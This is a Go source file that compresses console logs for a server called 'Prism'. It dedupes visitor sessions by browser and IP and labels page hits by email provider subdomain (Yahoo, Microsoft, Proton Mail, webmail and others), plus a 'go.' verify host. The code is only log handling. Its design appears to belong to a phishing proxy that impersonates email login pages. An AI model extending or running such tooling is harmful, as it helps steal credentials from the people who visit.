package main

import (
	"bufio"
	"io"
	"log"
	"os"
	"strings"
	"time"
)

// consoleLogWriter keeps production console output intentionally small.
// Existing application logging calls remain untouched; this writer only
// controls what reaches stdout/PM2.
type consoleLogWriter struct {
	dst io.Writer
}

const visitorLogDedupeWindow = 5 * time.Minute

func installCompactConsole() {
	originalStdout := os.Stdout

	// Route fmt.Print/Printf output through the same compact filter.
	reader, writer, err := os.Pipe()
	if err == nil {
		os.Stdout = writer
		go filterStdout(reader, originalStdout)
	}

	// The standard log package normally writes to stderr. Send it through the
	// compact filter and then to the original stdout so PM2 gets one stream.
	log.SetOutput(&consoleLogWriter{dst: originalStdout})
}

func (w *consoleLogWriter) Write(p []byte) (int, error) {
	line := strings.TrimRight(string(p), "\r\n")
	if out, ok := compactLogLine(line); ok {
		_, err := io.WriteString(w.dst, out+"\n")
		if err != nil {
			return 0, err
		}
	}
	return len(p), nil
}

func filterStdout(reader *os.File, dst io.Writer) {
	scanner := bufio.NewScanner(reader)
	buf := make([]byte, 0, 64*1024)
	scanner.Buffer(buf, 1024*1024)

	// This map affects console output only. Prism's real session creation and
	// routing behavior are not changed. Multiple subdomain sessions generated
	// by one browser during the same page load are collapsed into one visitor
	// event using the existing UA+IP text from the original session log line.
	seenVisitors := make(map[string]time.Time)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		if strings.Contains(line, "New session:") {
			rest := fieldAfter(line, "New session:")
			id := ""
			if fields := strings.Fields(rest); len(fields) > 0 {
				id = fields[0]
			}

			// Everything after the generated session ID is the existing browser/IP
			// signature. Use it only to prevent duplicate console messages.
			visitorKey := strings.TrimSpace(rest)
			if id != "" {
				visitorKey = strings.TrimSpace(strings.TrimPrefix(visitorKey, id))
			}

			now := time.Now()
			if visitorKey != "" {
				if lastSeen, exists := seenVisitors[visitorKey]; exists && now.Sub(lastSeen) < visitorLogDedupeWindow {
					continue
				}
				seenVisitors[visitorKey] = now

				// Opportunistic cleanup keeps the logging-only map bounded.
				for key, lastSeen := range seenVisitors {
					if now.Sub(lastSeen) >= visitorLogDedupeWindow {
						delete(seenVisitors, key)
					}
			}
			}

			out := now.Format("2006/01/02 15:04:05") + " 🟢 VISITOR   •  New"
			if id != "" {
				out += "  •  ID " + id
			}
			_, _ = io.WriteString(dst, out+"\n")
			continue
		}

		// stdout is mostly banners, response dumps, and decorative diagnostics.
		// Keep only explicit operational problems.
		upper := strings.ToUpper(line)
		if strings.Contains(upper, "[!] ") ||
			strings.Contains(upper, "[ERROR]") ||
			strings.Contains(upper, "ERROR:") ||
			strings.Contains(upper, "WARNING:") {
			_, _ = io.WriteString(dst, line+"\n")
		}
	}
}

func compactLogLine(line string) (string, bool) {
	// Convert verbose root-request debug messages into compact page events.
	if strings.Contains(line, "Request reached Go!") {
		host := fieldBetween(line, "Host: ", " | Path:")
		path := fieldBetween(line, "Path: ", " | Method:")
		method := strings.TrimSpace(fieldAfter(line, "Method: "))

		if method == "GET" && (path == "/" || path == "/index.html") {
			prefix := ""
			if i := strings.Index(line, "["); i > 0 {
				prefix = strings.TrimSpace(line[:i]) + " "
			}

			if strings.HasPrefix(strings.ToLower(host), "go.") {
				return prefix + "🔐 VERIFY    •  " + host, true
			}

			return prefix + "📨 PROVIDER  •  " + providerDisplayName(host), true
		}
		return "", false
	}

	lower := strings.ToLower(line)

	// Startup/configuration lines are low volume and useful.
	if strings.Contains(line, "Listening on ") ||
		strings.Contains(line, "Advanced correlation engine started") ||
		strings.Contains(line, "[config]") {
		return line, true
	}

	// Keep actionable warnings, blocks, and failures.
	if strings.Contains(line, "[⛔]") ||
		strings.Contains(line, "[!] ") ||
		strings.Contains(line, "[x] BLOCKED") ||
		strings.Contains(lower, "error") ||
		strings.Contains(lower, "failed") ||
		strings.Contains(lower, "warning") {
		return line, true
	}

	return "", false
}

func providerDisplayName(host string) string {
	host = strings.ToLower(strings.TrimSpace(host))
	subdomain := host
	if i := strings.IndexByte(host, '.'); i >= 0 {
		subdomain = host[:i]
	}
	if i := strings.IndexByte(subdomain, '-'); i >= 0 {
		subdomain = subdomain[:i]
	}

	switch subdomain {
	case "yahoo":
		return "Yahoo"
	case "microsoft", "msa", "outlook", "office":
		return "Microsoft"
	case "turbify":
		return "Turbify"
	case "rackspace":
		return "Rackspace"
	case "zoho":
		return "Zoho"
	case "proton", "protonmail":
		return "Proton Mail"
	case "fastmail":
		return "Fastmail"
	case "tuta", "tutanota":
		return "Tuta"
	case "gmx":
		return "GMX"
	case "mailcom":
		return "Mail.com"
	case "yandex":
		return "Yandex"
	case "godaddy":
		return "GoDaddy"
	case "ionos":
		return "IONOS"
	case "namecheap":
		return "Namecheap"
	case "cpanel", "roundcube", "webmail", "custom":
		return "Webmail"
	}

	if subdomain == "" {
		return "Unknown"
	}
	return strings.ToUpper(subdomain[:1]) + subdomain[1:]
}

func fieldBetween(s, start, end string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}
	i += len(start)
	j := strings.Index(s[i:], end)
	if j < 0 {
		return strings.TrimSpace(s[i:])
	}
	return strings.TrimSpace(s[i : i+j])
}

func fieldAfter(s, start string) string {
	i := strings.Index(s, start)
	if i < 0 {
		return ""
	}
	return strings.TrimSpace(s[i+len(start):])
}
